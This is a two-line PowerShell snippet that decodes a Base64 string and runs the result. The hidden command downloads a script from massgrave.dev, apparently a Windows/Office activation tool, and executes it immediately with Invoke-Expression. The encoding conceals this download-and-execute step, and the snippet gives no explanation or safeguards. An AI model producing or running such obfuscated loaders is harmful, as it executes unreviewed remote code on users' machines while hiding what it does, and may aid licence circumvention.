$ScriptBlock = [Scriptblock]::Create((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aXJtIGh0dHBzOi8vbWFzc2dyYXZlLmRldi9nZXQgIHwgaWV4")))))

Invoke-Command -ScriptBlock $ScriptBlock
